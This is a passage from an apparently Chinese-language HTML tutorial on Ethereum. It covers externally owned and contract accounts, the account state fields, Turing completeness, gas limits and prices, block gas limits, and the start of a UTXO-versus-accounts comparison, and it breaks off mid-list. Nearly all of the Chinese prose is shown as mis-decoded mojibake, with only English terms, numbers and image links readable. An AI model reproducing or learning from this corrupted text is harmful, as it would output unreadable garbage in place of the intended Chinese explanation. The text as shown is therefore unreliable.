<p>æ—¢ç„¶ä»¥å¤ªåŠç¤¾åŒºé€‰æ‹©è®©ä»¥å¤ªåŠæ‹¥æœ‰å¦‚æ­¤å¼ºå¤§çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆç›¸å¯¹åº”çš„ï¼Œä»–ä»¬ä¹Ÿå¿…é¡»ä¸ºæ­¤åšå¥½å‡†å¤‡ã€‚æˆ‘ä»¬ä¸€æ¡æ¡çœ‹ä¸€ä¸‹ï¼Œä¸ºäº†å®ç°å¯¹æ¯”ç‰¹å¸çš„æ”¹è¿›ï¼Œä»¥å¤ªåŠå¿…é¡»æ·»åŠ ä»€ä¹ˆåŠŸèƒ½ã€‚</p>
<p>å¯¹æ¯”ä¸€ä¸‹ä»¥å¤ªåŠç™½çš®ä¹¦ä¸­åˆ—å‡ºçš„æ¯”ç‰¹å¸å’Œä»¥å¤ªåŠçš„çŠ¶æ€è½¬æ¢å›¾ï¼š</p>
<p>æ¯”ç‰¹å¸ä½œä¸ºçŠ¶æ€è½¬ç§»ç³»ç»Ÿ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233062.jpg" alt="img"></p>
<p>ä»¥å¤ªåŠçš„çŠ¶æ€è½¬æ¢ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233063.jpg" alt="img"></p>
<p>åœ¨ä¸Šå›¾ä¸­ï¼Œèµ·å§‹çŠ¶æ€ä¿æŠ¤äº†å››ä¸ªè´¦æˆ·ï¼Œåˆ†åˆ«æ˜¯14c5f8baã€bb75a980ã€892bf92fã€4096ad65ã€‚å…¶ä¸­14c5f8baå’Œ4096ad65ä»…ç»´æŠ¤äº†ä½™é¢ï¼›bb75a980å’Œ892bf92fé™¤äº†ä½™é¢ä¹‹å¤–ï¼Œè¿˜åŒ…æ‹¬ä¸€éƒ¨åˆ†çš„ä»£ç å’Œæ•°æ®ã€‚äº¤æ˜“æ•°æ®ç”±14c5f8baå‘é€åˆ°bb75a980ï¼Œè½¬è´¦10ä¸ªä»¥å¤ªå¸ã€‚åŒæ—¶å‘é€äº†ä¸¤ä¸ªæ•°æ®2å’Œâ€œcharlieâ€ã€‚è¿™ä¸ªæ•°æ®ä¼ é€’åˆ°è´¦æˆ·bb75a980æ—¶ï¼Œè§¦å‘äº†bb75a980è´¦æˆ·ä¸­çš„ä»£ç ï¼Œæ„æ€æ˜¯å¦‚æœåœ¨å¯¹åº”äºäº¤æ˜“ä¸­æºå¸¦çš„æ•°æ®ä¸­çš„ç¬¬ä¸€ä¸ªï¼ˆä½œä¸ºç´¢å¼•ï¼‰ï¼Œä¹Ÿå³tx.data[0]ï¼Œç›¸å¯¹åº”çš„ä½ç½®å¤„çš„æ•°æ®æ˜¯0ï¼Œåˆ™å¯¹è¯¥ä½ç½®å‡ºçš„æ•°æ®è¿›è¡Œæ›´æ–°ï¼Œæ›´æ–°ä¸ºç¬¬äºŒä¸ªæ•°æ®ï¼Œä¹Ÿå³â€˜charlieâ€™ã€‚</p>
<p>æ‰€ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ç†è§£ä¸€ä¸‹ä»¥å¤ªåŠè´¦æˆ·çš„æ¦‚å¿µã€‚</p>
<p>ä»¥å¤ªåŠçš„å…¨å±€â€œå…±äº«çŠ¶æ€â€æ˜¯æœ‰å¾ˆå¤šå¯¹è±¡ï¼ˆè´¦æˆ·ï¼‰æ¥ç»„æˆçš„ï¼Œè¿™äº›è´¦æˆ·å¯ä»¥é€šè¿‡æ¶ˆæ¯ä¼ é€’æ¶æ„æ¥ä¸å¯¹æ–¹è¿›è¡Œäº¤äº’ã€‚æ¯ä¸ªè´¦æˆ·éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹å…³è”çš„çŠ¶æ€(state)å’Œä¸€ä¸ª20å­—èŠ‚çš„åœ°å€(address)ã€‚åœ¨ä»¥å¤ªåŠä¸­ä¸€ä¸ªåœ°å€æ˜¯160ä½çš„æ ‡è¯†ç¬¦ï¼Œç”¨æ¥è¯†åˆ«è´¦æˆ·çš„ã€‚</p>
<p>æœ‰ä¸¤ç§ç±»å‹çš„è´¦æˆ·ï¼š</p>
<ol>
<li>å¤–éƒ¨æ‹¥æœ‰çš„è´¦æˆ·ï¼Œè¢«ç§é’¥æ§åˆ¶ä¸”æ²¡æœ‰ä»»ä½•ä»£ç ä¸ä¹‹å…³è”</li>
<li>åˆçº¦è´¦æˆ·ï¼Œè¢«å®ƒä»¬çš„åˆçº¦ä»£ç æ§åˆ¶ä¸”æœ‰ä»£ç ä¸ä¹‹å…³è”</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233064.jpg" alt="img"></p>
<h2 id="å¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼ˆEOAï¼‰ä¸åˆçº¦è´¦æˆ·çš„æ¯”è¾ƒ"><a href="#å¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼ˆEOAï¼‰ä¸åˆçº¦è´¦æˆ·çš„æ¯”è¾ƒ" class="headerlink" title="å¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼ˆEOAï¼‰ä¸åˆçº¦è´¦æˆ·çš„æ¯”è¾ƒ"></a>å¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼ˆEOAï¼‰ä¸åˆçº¦è´¦æˆ·çš„æ¯”è¾ƒ</h2><p>ç†è§£å¤–éƒ¨æ‹¥æœ‰è´¦æˆ·å’Œåˆçº¦è´¦æˆ·çš„åŸºæœ¬åŒºåˆ«æ˜¯å¾ˆé‡è¦çš„ã€‚ä¸€ä¸ªå¤–éƒ¨æ‹¥æœ‰çš„è´¦æˆ·å¯ä»¥é€šè¿‡åˆ›å»ºå’Œç”¨è‡ªå·±çš„ç§é’¥æ¥å¯¹äº¤æ˜“è¿›è¡Œç­¾åï¼Œæ¥å‘é€æ¶ˆæ¯ç»™å¦ä¸€ä¸ªå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·æˆ–åˆçº¦è´¦æˆ·ã€‚åœ¨ä¸¤ä¸ªå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ä¹‹é—´ä¼ é€çš„æ¶ˆæ¯åªæ˜¯ä¸€ä¸ªç®€å•çš„ä»·å€¼è½¬ç§»ã€‚ä½†æ˜¯ä»å¤–éƒ¨æ‹¥æœ‰çš„è´¦æˆ·åˆ°åˆçº¦è´¦æˆ·çš„æ¶ˆæ¯ä¼šæ¿€æ´»åˆçº¦è´¦æˆ·çš„ä»£ç ï¼Œå…è®¸å®ƒæ‰§è¡Œå„ç§åŠ¨ä½œã€‚ï¼ˆæ¯”å¦‚è½¬ç§»ä»£å¸ï¼Œå†™å…¥å†…éƒ¨å­˜å‚¨ï¼ŒæŒ–å‡ºä¸€ä¸ªæ–°ä»£å¸ï¼Œæ‰§è¡Œä¸€äº›è¿ç®—ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„åˆçº¦ç­‰ç­‰ï¼‰ã€‚</p>
<p>ä¸åƒå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼Œåˆçº¦è´¦æˆ·ä¸å¯ä»¥è‡ªå·±å‘èµ·ä¸€ä¸ªäº¤æ˜“ã€‚ç›¸åï¼Œåˆçº¦è´¦æˆ·åªæœ‰åœ¨æ¥æ”¶åˆ°ä¸€ä¸ªäº¤æ˜“ä¹‹å(ä»ä¸€ä¸ªå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·æˆ–å¦ä¸€ä¸ªåˆçº¦è´¦æˆ·æ¥)ï¼Œä¸ºäº†å“åº”æ­¤äº¤æ˜“è€Œè§¦å‘ä¸€ä¸ªäº¤æ˜“ã€‚æˆ‘ä»¬å°†ä¼šåœ¨â€œäº¤æ˜“å’Œæ¶ˆæ¯â€éƒ¨åˆ†æ¥äº†è§£å…³äºåˆçº¦ä¸åˆçº¦ä¹‹é—´çš„é€šä¿¡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233065.jpg" alt="img"></p>
<p>å› æ­¤ï¼Œåœ¨ä»¥å¤ªåŠä¸Šä»»ä½•çš„åŠ¨ä½œï¼Œæ€»æ˜¯è¢«å¤–éƒ¨æ§åˆ¶è´¦æˆ·è§¦å‘çš„äº¤æ˜“æ‰€å‘åŠ¨çš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233066.jpg" alt="img"></p>
<h3 id="è´¦æˆ·çŠ¶æ€"><a href="#è´¦æˆ·çŠ¶æ€" class="headerlink" title="è´¦æˆ·çŠ¶æ€"></a>è´¦æˆ·çŠ¶æ€</h3><p>è´¦æˆ·çŠ¶æ€æœ‰å››ä¸ªç»„æˆéƒ¨åˆ†ï¼Œä¸è®ºè´¦æˆ·ç±»å‹æ˜¯ä»€ä¹ˆï¼Œéƒ½å­˜åœ¨è¿™å››ä¸ªç»„æˆéƒ¨åˆ†ï¼š</p>
<ol>
<li>nonceï¼šå¦‚æœè´¦æˆ·æ˜¯ä¸€ä¸ªå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼Œnonceä»£è¡¨ä»æ­¤è´¦æˆ·åœ°å€å‘é€çš„äº¤æ˜“åºå·ã€‚å¦‚æœè´¦æˆ·æ˜¯ä¸€ä¸ªåˆçº¦è´¦æˆ·ï¼Œnonceä»£è¡¨æ­¤è´¦æˆ·åˆ›å»ºçš„åˆçº¦åºå·</li>
<li>balanceï¼š æ­¤åœ°å€æ‹¥æœ‰Weiçš„æ•°é‡ã€‚1 Ether&#x3D;10^18 Wei</li>
<li>storageRootï¼š Merkle Patriciaæ ‘çš„æ ¹èŠ‚ç‚¹Hashå€¼ã€‚Merkleæ ‘ä¼šå°†æ­¤è´¦æˆ·å­˜å‚¨å†…å®¹çš„Hashå€¼è¿›è¡Œç¼–ç ï¼Œé»˜è®¤æ˜¯ç©ºå€¼</li>
<li>codeHashï¼šæ­¤è´¦æˆ·EVMï¼ˆä»¥å¤ªåŠè™šæ‹Ÿæœºï¼Œåé¢ç»†è¯´ï¼‰ä»£ç çš„hashå€¼ã€‚å¯¹äºåˆçº¦è´¦æˆ·ï¼Œå°±æ˜¯è¢«Hashçš„ä»£ç å¹¶ä½œä¸ºcodeHashä¿å­˜ã€‚å¯¹äºå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼ŒcodeHashåŸŸæ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²çš„Hashå€¼</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233067.jpg" alt="img"></p>
<p>å¯ä»¥ç®€å•ç†è§£EOAå°±æ˜¯å®é™…çš„ç”¨æˆ·ï¼›è€Œåˆçº¦è´¦æˆ·å°±æ˜¯EOAç”¨æˆ·éƒ¨ç½²çš„åˆçº¦ï¼Œå¤–éƒ¨æ‰€æœ‰çš„è´¦æˆ·ï¼ˆEOA externally owned accountï¼‰ï¼ˆç”±ç§é’¥æ§åˆ¶çš„ï¼‰å’Œåˆçº¦è´¦æˆ·ï¼ˆç”±åˆçº¦ä»£ç æ§åˆ¶ï¼‰ã€‚å¤–éƒ¨æ‰€æœ‰çš„è´¦æˆ·æ²¡æœ‰ä»£ç ï¼Œäººä»¬å¯ä»¥é€šè¿‡åˆ›å»ºå’Œç­¾åä¸€ç¬”äº¤æ˜“ä»ä¸€ä¸ªå¤–éƒ¨è´¦æˆ·å‘é€æ¶ˆæ¯ã€‚æ¯å½“åˆçº¦è´¦æˆ·æ”¶åˆ°ä¸€æ¡æ¶ˆæ¯ï¼Œåˆçº¦å†…éƒ¨çš„ä»£ç å°±ä¼šè¢«æ¿€æ´»ï¼Œå…è®¸å®ƒå¯¹å†…éƒ¨å­˜å‚¨è¿›è¡Œè¯»å–å’Œå†™å…¥ï¼Œå’Œå‘é€å…¶å®ƒæ¶ˆæ¯æˆ–è€…åˆ›å»ºåˆçº¦ã€‚</p>
<p>##å›¾çµå®Œå¤‡æ€§</p>
<p>ä¹‹å‰åœ¨ä»‹ç»æ¯”ç‰¹å¸è„šæœ¬çš„æ—¶å€™ï¼Œæˆ‘ä»¬æåˆ°è¿‡æ¯”ç‰¹å¸çš„è„šæœ¬æ˜¯æ•…æ„è®¾è®¡æˆä¸å®Œå¤‡çš„ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºä¹‹å‰åˆ†æè¿‡ï¼Œåœ¨äº¤æ˜“ä¸­å†™çš„è„šæœ¬ï¼Œæ˜¯éœ€è¦æœ‰çŸ¿å·¥æ¥æ‰§è¡Œå¹¶è¿›è¡Œç¡®è®¤çš„ã€‚å¦‚æœæ˜¯å›¾çµå®Œå¤‡çš„ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½ä¼šå‡ºç°æ­»å¾ªç¯çš„ä»£ç ï¼Œå¯¹äºçŸ¿å·¥è€Œè¨€æ˜¯éå¸¸ä¸åˆ©çš„ã€‚</p>
<p>æ—¢ç„¶ä»¥å¤ªåŠæ˜ç¡®åœ°åœ¨æŒ‘åˆºå„¿ï¼Œä¹Ÿå°±æ„å‘³ç€åœ¨ä»¥å¤ªåŠä¸­å®ç°çš„è„šæœ¬è¯­è¨€æ˜¯å›¾çµå®Œå¤‡çš„ã€‚æ—¢ç„¶è¿™æ ·ï¼Œä»¥å¤ªåŠå¿…é¡»è¦è§£å†³çš„é—®é¢˜æ˜¯ï¼Œå¦‚ä½•åº”å¯¹æ­»å¾ªç¯å¯èƒ½ä¼šæ— é™åœ°æ¶ˆè€—ï¼Ÿ</p>
<p>ä»¥å¤ªåŠä¸­å¼•å…¥äº†gasï¼ˆç“¦æ–¯ã€æ²¹ä»·ç­‰ä¸­æ–‡ç¿»è¯‘ï¼‰çš„æ¦‚å¿µã€‚ä»¥å¤ªåŠåœ¨åŒºå—é“¾ä¸Šå®ç°äº†ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œè¢«ç§°ä¸ºä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰ï¼Œå‚ä¸åˆ°ç½‘ç»œçš„èŠ‚ç‚¹éƒ½ä¼šè¿è¡ŒEVMï¼ŒéªŒè¯åŒºå—ä¸­çš„æ¯ä¸ªäº¤æ˜“å¹¶åœ¨EVMä¸­è¿è¡Œäº¤æ˜“æ‰€è§¦å‘çš„ä»£ç ã€‚åˆçº¦å¯ä»¥åˆ©ç”¨çš„æ¯ä¸ªå‘½ä»¤éƒ½ä¼šæœ‰ä¸€ä¸ªç›¸åº”çš„è´¹ç”¨å€¼ï¼Œè´¹ç”¨ä½¿ç”¨gasä½œä¸ºå•ä½è®¡æ•°ï¼Œä¹Ÿå³ç”¨æˆ·ä»˜ç»™çŸ¿å·¥çš„ä½£é‡‘ã€‚<a href="https://link.zhihu.com/?target=https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit%23gid=0">è¿™é‡Œåˆ—äº†ä¸€äº›å‘½ä»¤çš„gasæ¶ˆè€—ã€‚</a>ä¾‹ï¼š<code>PUSHæ“ä½œ</code>éœ€è¦æ¶ˆè€—<code>3ä¸ªgas</code>ï¼Œ<code>ä¸€æ¬¡è½¬è´¦</code>ä¸€èˆ¬è¦æ¶ˆè€—<code>21000 gas</code>ï¼Œgasä½¿ç”¨<code>ether</code>ï¼ˆä»¥å¤ªå¸ï¼‰æ¥æ”¯ä»˜ã€‚</p>
<p>Gaså¸¸ç”¨çš„å•ä½æ˜¯weiï¼Œweiå’Œetherçš„å…³ç³»å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233068.jpg" alt="img"></p>
<p>æ¯ç¬”äº¤æ˜“éƒ½è¢«è¦æ±‚åŒ…æ‹¬gas limitï¼ˆstartGasï¼Œé™åˆ¶ï¼‰å’ŒGas Priceï¼ˆä»·æ ¼ï¼‰ã€‚Gas Limit æ˜¯ç”¨æˆ·æ„¿æ„ä¸ºæ‰§è¡ŒæŸä¸ªæ“ä½œæˆ–ç¡®è®¤äº¤æ˜“æ”¯ä»˜çš„æœ€å¤§Gasé‡ï¼ˆæœ€å°‘21,000ï¼‰ã€‚Gas Price æ˜¯ Gwei çš„æ•°é‡ï¼Œç”¨æˆ·æ„¿æ„èŠ±è´¹äºæ¯ä¸ª Gas å•ä½çš„ä»·é’±ã€‚å‘é€è€…æ”¯ä»˜çš„Gas Priceè¶Šé«˜ï¼Œåˆ™å…¶äº¤æ˜“çš„ä¼˜å…ˆçº§è¶Šé‡è¦ï¼Œå› ä¸ºçŸ¿å·¥æ‰“åŒ…è¯¥äº¤æ˜“è·å¾—çš„æŠ¥é…¬ä¼šæ›´é«˜ï¼Œè¿™æ ·è¿™ä¸ªäº¤æ˜“ä¼šè¾ƒå¿«åœ°è¢«æ‰“åŒ…åˆ°åŒºå—ä¸­ï¼Œæ›´æ—©åœ°è·å¾—ç¡®è®¤ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233069.jpg" alt="img"></p>
<p>å¦‚æœè¯¥äº¤æ˜“éœ€è¦ä½¿ç”¨çš„gasæ•°é‡å°äºæˆ–ç­‰äºæ‰€è®¾ç½®çš„gas limitï¼Œé‚£ä¹ˆè¿™ä¸ªäº¤æ˜“ä¼šè¢«æˆåŠŸå¤„ç†ã€‚å¦‚æœgasæ€»æ¶ˆè€—è¶…è¿‡gas limitï¼Œé‚£ä¹ˆæ‰€æœ‰çš„æ“ä½œéƒ½ä¼šè¢«å¤åŸï¼ˆå›æ»šï¼‰ï¼Œä½†æ˜¯äº¤æ˜“è´¹ä»ç„¶ä¼šè¢«çŸ¿å·¥æ”¶å–ã€‚åŒºå—é“¾ä¼šæ˜¾ç¤ºè¿™ç¬”äº¤æ˜“å®Œæˆå°è¯•ï¼Œä½†å› ä¸ºæ²¡æœ‰æä¾›è¶³å¤Ÿçš„gaså¯¼è‡´æ‰€æœ‰çš„åˆçº¦å‘½ä»¤éƒ½è¢«å¤åŸã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233070.jpg" alt="img"></p>
<p>å¦‚æœäº¤æ˜“é‡Œgasæ²¡æœ‰è¢«æ¶ˆè€—å®Œæ¯•ï¼Œå‰©ä¸‹çš„gaséƒ½ä¼šä»¥ä»¥å¤ªå¸ï¼ˆetherï¼‰çš„å½¢å¼æ‰“å›ç»™äº¤æ˜“å‘èµ·è€…ã€‚å› ä¸ºgasæ¶ˆè€—ä¸€èˆ¬åªæ˜¯ä¸€ä¸ªå¤§è‡´ä¼°ç®—ï¼Œæ‰€ä»¥è®¸å¤šç”¨æˆ·ä¼šè¶…é¢æ”¯ä»˜gasæ¥ä¿è¯ä»–ä»¬çš„äº¤æ˜“ä¼šè¢«æ¥å—ã€‚è¿™æ ·å¦‚æœæ¶æ„ç”¨æˆ·åœ¨äº¤æ˜“ä¸­åŒ…æ‹¬äº†æ­»å¾ªç¯ï¼Œé‚£ä¹ˆä¸è®ºä»˜å‡ºå¤šå°‘gasï¼Œæœ€ç»ˆéƒ½ä¼šæ¶ˆè€—å®Œã€‚å¦å¤–ï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºè¿™æ ·çš„ä»£ä»·é—®é¢˜ï¼Œè™½ç„¶ä»¥å¤ªåŠçš„è„šæœ¬è¯­è¨€æ˜¯å›¾çµå®Œå¤‡çš„ï¼Œä¹Ÿå³å½“å‰çš„æ‰€æœ‰ä»£ç éƒ½å¯ä»¥åœ¨ä»¥å¤ªåŠåŒºå—é“¾ä¸Šè¿è¡Œï¼Œä½†æ˜¯ä½œä¸ºå¼€å‘è€…ï¼Œéœ€è¦è®¤çœŸè€ƒè™‘ä»£ç çš„æ•ˆç‡ã€‚ä¸¤ä¸ªåŒæ ·åŠŸèƒ½çš„åˆåŒï¼Œæ•ˆç‡é«˜çš„é‚£ä¸ªæ‰èƒ½ç”Ÿå­˜ä¸‹æ¥ã€‚ä¸€ä¸ªå¸®åŠ©äººä»¬ç†è§£ä»¥å¤ªåŠåˆåŒå®é™…èƒ½åŠ›çš„å¯å‘é—®é¢˜æ˜¯ï¼šè¿™ä¸ªåŠŸèƒ½æ˜¯å¦èƒ½åœ¨ä¸€ä¸ª1999å¹´çš„æ™ºèƒ½æ‰‹æœºä¸Šå®ç°ï¼Ÿ</p>
<p>æ€»ç»“ï¼Œå½“è¿›è¡Œæ¯ç¬”äº¤æ˜“æ—¶ï¼Œç”¨æˆ·è®¾å®šGas Limit å’ŒGas Priceï¼Œåœ¨è¿è¡Œæ—¶ï¼ŒçŸ¿å·¥é¦–å…ˆè®¡ç®— Gas Limit*Gas Price ï¼Œå°±å¾—åˆ°äº†ETHäº¤æ˜“ä½£é‡‘çš„æˆæœ¬ï¼Œç„¶åè¿™ç¬”è´¹ç”¨é¦–å…ˆä»ç”¨æˆ·çš„è´¦æˆ·ä¸­æ‰£é™¤ï¼Œäº¤æ˜“è¿è¡Œå®Œæ¯•ï¼Œå¦‚æœæœ‰å‰©ä½™ï¼Œå†è¿˜ç»™ç”¨æˆ·ã€‚å¦‚æœä¸å¤Ÿï¼ŒçŸ¿å·¥ä¹Ÿä¸è¿˜é’±ï¼Œåªæ˜¯æŠŠäº¤æ˜“å…¨éƒ¨å›æ»šã€‚</p>
<p>å‘é€è€…æ”¯ä»˜çš„Gas Priceè¶Šé«˜ï¼Œåˆ™å…¶äº¤æ˜“çš„ä¼˜å…ˆçº§è¶Šé‡è¦ï¼Œå› ä¸ºçŸ¿å·¥çš„æŠ¥é…¬ä¼šæ›´é«˜ã€‚ ä½†æ˜¯ï¼Œé€šè¿‡è®¾ç½®è¾ƒä½ç‡ƒæ–™ä»·æ ¼ï¼ˆGasPriceï¼‰ï¼Œå‘é€è€…å¯ä»¥èŠ‚çœèµ„é‡‘ã€‚ä»¥å¤ªåŠå®¢æˆ·ç«¯çš„Frontierç‰ˆæœ¬æœ‰ä¸€ä¸ªé»˜è®¤çš„gasPriceï¼Œå³0.05e12 weiã€‚çŸ¿å·¥ä¸ºäº†æœ€å¤§åŒ–ä»–ä»¬çš„æ”¶ç›Šï¼Œå¦‚æœå¤§é‡çš„äº¤æ˜“éƒ½æ˜¯ä½¿ç”¨é»˜è®¤gasPriceå³0.05e12 weiï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå°±å¾ˆéš¾è¦çŸ¿å·¥å»æ¥å—ä¸€ä¸ªä½gasPriceäº¤æ˜“ï¼Œæ›´åˆ«è¯´0 gasPriceäº¤æ˜“äº†ã€‚</p>
<p>é™¤äº†è®¡ç®—äº¤æ˜“çš„èŠ±è´¹ä¹‹å¤–ï¼Œå°†äº¤æ˜“æˆ–è€…åˆçº¦ä¸Šä¼ ä¹Ÿéœ€è¦è´¹ç”¨ã€‚è™½ç„¶è¯»å–æœ¬åœ°åŒºå—é“¾æ˜¯å…è´¹çš„ï¼Œä½†å†™å…¥å’Œè¿ç®—æ˜¯èŠ±é’±çš„ã€‚å‚¨å­˜æ›´æ˜¯å°¤å…¶æ˜‚è´µï¼Œå› ä¸ºä»»ä½•å†™å…¥çš„ä¿¡æ¯éƒ½ä¼šè¢«æ°¸ä¹…çš„å‚¨å­˜ç€ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒCPUè¿ç®—å¾ˆä¾¿å®œã€‚ä»¥å¤ªåŠæ˜¯å›¾çµå®Œå¤‡çš„ï¼Œè°ä¹Ÿæ‹¦ä¸ä½ä½ å†™ä¸€ä¸ªè§†é¢‘è§£ç å™¨ç„¶åå‘å¸ƒåœ¨åŒºå—é“¾ä¸Šï¼›åªä¸è¿‡ä¼°è®¡ä½ æ²¡é’±è¿è¡Œå®ƒã€‚å‡è®¾è¿™æ ·çš„ç¨‹åºçš„ä»£ç è‡³å°‘æœ‰å‡ åƒè¡Œï¼Œå³ä½¿æŠŠå®ƒä¸Šä¼ åˆ°åŒºå—é“¾ä¸Šä¹Ÿä¸ä¼šä¾¿å®œã€‚è­¬å¦‚ï¼Œgas limit&#x3D;2000ï¼Œå‡è®¾äº¤æ˜“é•¿ä¸º170å­—èŠ‚ï¼Œæ¯å­—èŠ‚çš„è´¹ç”¨æ˜¯5ï¼Œå‡å»850ï¼Œæ‰€ä»¥è¿˜å‰©1150ï¼Œå‰©ä¸‹çš„æ‰æ˜¯è¿è¡Œäº¤æ˜“èƒ½ä½¿ç”¨çš„gasä¸Šé™ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œæ¯ä¸ªå—è¿˜æœ‰Block gas limitï¼Œè¿™ä¸ªå€¼åœ¨åˆ›ä¸–åŒºå—çš„é…ç½®æ–‡ä»¶ä¸­å¯ä»¥æŒ‡å®šï¼Œè­¬å¦‚æŸ¥çœ‹ä¸€ä¸ªåŒºå—çš„ä¿¡æ¯å¦‚ä¸‹ï¼Œä¹Ÿå³åŒºå—çš„gas limitæ˜¯3573388ã€‚block gas limitçš„ç”¨æ„æ˜¯é™åˆ¶ä¸€ä¸ªåŒºå—ä¸­èƒ½å¤ŸåŒ…å«çš„äº¤æ˜“çš„æ•°é‡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233071.jpg" alt="img"></p>
<p><strong>ï¼ˆäºŒï¼‰Value-blindness</strong></p>
<p>åŒæ ·çš„ï¼Œæ¥å›å¿†ä¸€ä¸‹ï¼Œæ¯”ç‰¹å¸ä¸ºä»€ä¹ˆæ”¾å¼ƒäº†åŸºäºè´¦æˆ·çš„æ¦‚å¿µï¼Œè€Œé‡‡å–UTXOæœºåˆ¶çš„å‘¢ï¼Ÿ</p>
<p>ä½¿ç”¨UTXOå¯ä»¥é¿å…ç»´æŠ¤è´¦æˆ·ä½™é¢çš„éº»çƒ¦ã€‚ä¸ºä»€ä¹ˆç»´æŠ¤ä½™é¢å¾ˆéº»çƒ¦å‘¢ï¼Ÿå› ä¸ºä¸ºäº†ä½¿ç”¨ä½™é¢ï¼Œä¹Ÿå³èƒ½å¤Ÿè®©çŸ¿å·¥æ£€æŸ¥å’ŒéªŒè¯ä½™é¢ï¼Œä½™é¢å¿…é¡»æ˜¯å…¨å±€å¯è§çš„æ•°æ®ã€‚è€ŒåŸºæœ¬ä¸Šæ¯ä¸ªäº¤æ˜“éƒ½ä¼šå¯¹ä½™é¢äº§ç”Ÿå½±å“å’Œå¸¦æ¥å˜åŒ–ã€‚ä¹Ÿå³ï¼Œä½™é¢å¿…é¡»è¦å…¨å±€å¯è§ï¼Œèƒ½å¿«é€Ÿåœ°æ›´æ–°ï¼Œè€Œä¸”å¯ä»¥éªŒè¯ã€‚</p>
<p><strong>ã€UTXOçš„ä¼˜ç‚¹ï¼š 1.è¾ƒé«˜ç¨‹åº¦çš„éšç§ä¿æŠ¤ã€‚</strong>å¦‚æœç”¨æˆ·æ¯æ¬¡äº¤æ˜“éƒ½ä½¿ç”¨ä¸€ä¸ªæ–°çš„åœ°å€ï¼Œé‚£ä¹ˆè´¦æˆ·ä¹‹é—´çš„ç›¸äº’å…³è”å°±å¾ˆå›°éš¾ã€‚è¿™æ ·åšé€‚ç”¨äºå¯¹å®‰å…¨æ€§è¦æ±‚é«˜çš„è´§å¸ç³»ç»Ÿã€‚<strong>2.æ½œåœ¨åœ°å¯æ‰©å±•æ€§ã€‚</strong> UTXOåœ¨ç†è®ºä¸Šå¯æ‰©å±•æ€§æ›´å¥½ã€‚å¯¹äºç»´æŠ¤äº¤æ˜“çš„Merkleæ ‘ï¼Œå³ä½¿æ‰€æœ‰çš„äºº(åŒ…æ‹¬æ•°æ®çš„æ‹¥æœ‰è€…)éƒ½é—å¿˜äº†æŸä¸€æ•°æ®ï¼ŒçœŸæ­£å—æŸä¹Ÿåªæœ‰æ•°æ®çš„æ‹¥æœ‰è€…ï¼Œå…¶ä»–äººä¸å—å½±å“ã€‚ ä½†åœ¨ä»¥å¤ªåŠè´¦æˆ·ç³»ç»Ÿä¸­ï¼Œä»»ä½•äººå¼„ä¸¢äº†ä¸€ä¸ªè´¦æˆ·å¯¹åº”åœ¨é»˜å…‹å°”æ ‘ä¸­ä¿¡æ¯ï¼Œé‚£ä¹ˆå°†æ— æ³•å¤„ç†ä»»ä½•èƒ½å¤Ÿå½±å“è´¦æˆ·çš„æ¶ˆæ¯ã€‚ç›¸å½“äºUTXOæ˜¯ä¸€æ¬¡æ€§çš„ï¼›è€Œè´¦æˆ·æ˜¯å¯é‡ç”¨çš„ã€‚ã€‘</p>
<p>æ—¢ç„¶ä»¥å¤ªåŠæœŸæœ›å¯ä»¥æœ‰æ˜ç¡®çš„ä»·å€¼ï¼Œå¿…é¡»èƒ½å¤Ÿå®ç°ä½™é¢çš„æ¦‚å¿µã€‚ä½™é¢ç›¸å¯¹äºUTXOä¹Ÿæœ‰ä¸€äº›ä¼˜ç‚¹ï¼š</p>
